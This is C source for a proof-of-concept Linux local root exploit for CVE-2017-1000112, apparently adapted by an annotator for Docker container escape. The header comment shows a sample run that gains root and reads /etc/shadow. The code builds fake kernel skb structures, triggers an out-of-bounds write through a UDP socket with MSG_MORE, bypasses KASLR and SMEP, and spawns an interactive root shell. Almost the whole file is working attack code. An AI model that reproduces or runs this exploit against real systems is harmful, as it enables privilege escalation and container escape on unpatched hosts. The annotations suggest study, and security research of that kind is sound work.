// A proof-of-concept local root exploit for CVE-2017-1000112.
// Includes KASLR and SMEP bypasses. No SMAP bypass.
// Tested on Ubuntu trusty 4.4.0-* and Ubuntu xenial 4-8-0-* kernels.
//
// Usage:
// user@ubuntu:~$ uname -a
// Linux ubuntu 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
// user@ubuntu:~$ whoami
// user
// user@ubuntu:~$ id
// uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
// user@ubuntu:~$ gcc pwn.c -o pwn
// user@ubuntu:~$ ./pwn 
// [.] starting
// [.] checking distro and kernel versions
// [.] kernel version '4.8.0-58-generic' detected
// [~] done, versions looks good
// [.] checking SMEP and SMAP
// [~] done, looks good
// [.] setting up namespace sandbox
// [~] done, namespace sandbox set up
// [.] KASLR bypass enabled, getting kernel addr
// [~] done, kernel text:   ffffffffae400000
// [.] commit_creds:        ffffffffae4a5d20
// [.] prepare_kernel_cred: ffffffffae4a6110
// [.] SMEP bypass enabled, mmapping fake stack
// [~] done, fake stack mmapped
// [.] executing payload ffffffffae40008d
// [~] done, should be root now
// [.] checking if we got root
// [+] got r00t ^_^
// root@ubuntu:/home/user# whoami
// root
// root@ubuntu:/home/user# id
// uid=0(root) gid=0(root) groups=0(root)
// root@ubuntu:/home/user# cat /etc/shadow
// root:!:17246:0:99999:7:::
// daemon:*:17212:0:99999:7:::
// bin:*:17212:0:99999:7:::
// sys:*:17212:0:99999:7:::
// ...
//
// Andrey Konovalov <andreyknvl@gmail.com>

#include "./pwn.h"
#include "./toolset.h"
#include "./test.h"
#include "./docker_escape.h"
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// * * * * * * * * * * * * * * Kernel structs * * * * * * * * * * * * * * * *

/* KM: COPY from kernel
 * The callback notifies userspace to release buffers when skb DMA is done in
 * lower device, the skb last reference should be 0 when calling this.
 * The zerocopy_success argument is true if zero copy transmit occurred,
 * false on data copy or out of memory error caused by data copy attempt.
 * The ctx field is used to track device context.
 * The desc field is used to track userspace buffer index.
 */

struct ubuf_info {
	uint64_t callback;	// void (*callback)(struct ubuf_info *, bool)  // KM: this will be set to get_root function
	uint64_t ctx;		// void *
	uint64_t desc;		// unsigned long
};

/* KM: COPY from kernel
 * This data is invariant across clones and lives at
 * the end of the header data, ie. at skb->end.
 */
struct skb_shared_info {    // size is 320!
	uint8_t nr_frags;	// unsigned char
	uint8_t tx_flags;	// __u8
	uint16_t gso_size;	// unsigned short
	uint16_t gso_segs;	// unsigned short
	uint16_t gso_type;	// unsigned short
	uint64_t frag_list;	// struct sk_buff *
	uint64_t hwtstamps;	// struct skb_shared_hwtstamps
	uint32_t tskey;		// u32
	uint32_t ip6_frag_id;	// __be32
	uint32_t dataref;	// atomic_t
	uint64_t destructor_arg; // void *   
	uint8_t frags[16][17];	// skb_frag_t frags[MAX_SKB_FRAGS];
};

struct ubuf_info ui;

void init_skb_buffer(char* buffer, unsigned long func) {
	struct skb_shared_info* ssi = (struct skb_shared_info*)buffer;
	memset(ssi, 0, sizeof(*ssi));

	ssi->tx_flags = 0xff;
	ssi->destructor_arg = (uint64_t)&ui;
	ssi->nr_frags = 0;
	ssi->frag_list = 0;

	ui.callback = func;
}

// * * * * * * * * * * * * * * * Trigger * * * * * * * * * * * * * * * * * *

#define SHINFO_OFFSET 3164

void oob_execute(unsigned long payload) {
	char buffer[4096];
	memset(&buffer[0], 0x42, 4096);
	// payload will be invoked in user space as a callback, there must be some trick to make it executed in kernel space
	init_skb_buffer(&buffer[SHINFO_OFFSET], payload);  // ???KM: what is the meaning of SHINFO_OFFSET

	int s = socket(PF_INET, SOCK_DGRAM, 0);   // udp套接字
	if (s == -1) {
		perror("[-] socket()");
		exit(EXIT_FAILURE);
	}

	struct sockaddr_in addr;
	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(8000);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);   // 127.0.0.1 8000
	if( inet_pton(AF_INET, "172.17.0.1", &addr.sin_addr) <= 0){
        perror("inet_pton error");
        exit(0);
    }

	if (connect(s, (void*)&addr, sizeof(addr))) {
		perror("[-] connect()");
		exit(EXIT_FAILURE);
	}

	int size = SHINFO_OFFSET + sizeof(struct skb_shared_info);
	// int rv = send(s, buffer, size, 0);   // send with MSG_MORE!!! (ref: https://www.openwall.com/lists/oss-security/2017/08/13/1)
	int rv = send(s, buffer, size, MSG_MORE);   // send with MSG_MORE!!! (ref: https://www.openwall.com/lists/oss-security/2017/08/13/1)
	if (rv != size) {
		perror("[-] send()");
		exit(EXIT_FAILURE);
	}

	int val = 1;
	rv = setsockopt(s, SOL_SOCKET, SO_NO_CHECK, &val, sizeof(val));   // ???KM: NO check on sum, does this trigger UFO to non-UFO?
	if (rv != 0) {
		perror("[-] setsockopt(SO_NO_CHECK)");
		exit(EXIT_FAILURE);
	}

	send(s, buffer, 1, 0);

	close(s);
}

// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * * *
void exec_shell() {
	char* shell = "/bin/bash";
	char* args[] = {shell, "-i", NULL};

	execve(shell, args, NULL);
}

bool is_root() {
	// We can't simple check uid, since we're running inside a namespace
	// with uid set to 0. Try opening /etc/shadow instead.
	int fd = open("/etc/shadow", O_RDONLY);
	if (fd == -1)
		return false;
	close(fd);
	return true;
}

void check_root() {
	printf("[.] checking if we got root\n");
	if (!is_root()) {
		printf("[-] something went wrong =(\n");
		return;
	}
	printf("[+] got r00t ^_^\n");
	exec_shell();
}

/* Inside Docker, the MTU of eth0 is default to 1500, 
 * which means we don't need to do the sandbox setup.
 * By the way, we don't have permission to do unshare()
 * or ifconfig in the default Docker enviroment.
void setup_sandbox() {
	int real_uid = getuid();
	int real_gid = getgid();

	if (unshare(CLONE_NEWUSER) != 0) {
		printf("[!] unprivileged user namespaces are not available\n");
		perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}
	if (unshare(CLONE_NEWNET) != 0) {
		perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}

	if (!write_file("/proc/self/setgroups", "deny")) {
		perror("[-] write_file(/proc/self/set_groups)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)) {
		perror("[-] write_file(/proc/self/uid_map)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
		perror("[-] write_file(/proc/self/gid_map)");
		exit(EXIT_FAILURE);
	}

	cpu_set_t my_set;
	CPU_ZERO(&my_set);
	CPU_SET(0, &my_set);
	if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
		perror("[-] sched_setaffinity()");
		exit(EXIT_FAILURE);
	}

	if (system("/sbin/ifconfig lo mtu 1500") != 0) {
		perror("[-] system(/sbin/ifconfig lo mtu 1500)");
		exit(EXIT_FAILURE);
	}
	if (system("/sbin/ifconfig lo up") != 0) {
		perror("[-] system(/sbin/ifconfig lo up)");
		exit(EXIT_FAILURE);
	}
}
*/
int main(int argc, char** argv) {
    test();

	printf("[.] starting\n");

	printf("[.] checking distro and kernel versions\n");
	kernel = detect_versions();
	printf("[~] done, versions looks good\n");

	printf("[.] checking SMEP and SMAP\n");
	check_smep_smap();
	printf("[~] done, looks good\n");

	/*
	printf("[.] setting up namespace sandbox\n");
	setup_sandbox();
	printf("[~] done, namespace sandbox set up\n");
	*/

#if ENABLE_KASLR_BYPASS
	printf("[.] KASLR bypass enabled, getting kernel addr\n");
	KERNEL_BASE = get_kernel_addr(kernel);
	printf("[~] done, kernel text:   %lx\n", KERNEL_BASE);
#endif
	
	printf("[.] commit_creds:        %lx\n", COMMIT_CREDS);
	printf("[.] prepare_kernel_cred: %lx\n", PREPARE_KERNEL_CRED);

	unsigned long payload = (unsigned long)&get_root;

#if ENABLE_SMEP_BYPASS
	printf("[.] SMEP bypass enabled, mmapping fake stack\n");
	mmap_stack();
	payload = XCHG_EAX_ESP_RET;
	printf("[~] done, fake stack mmapped\n");
#endif

	printf("[.] executing payload %lx\n", payload);
	oob_execute(payload);
	printf("[~] done, should be root now\n");
	check_root();
	// exec_shell();
	return 0;
}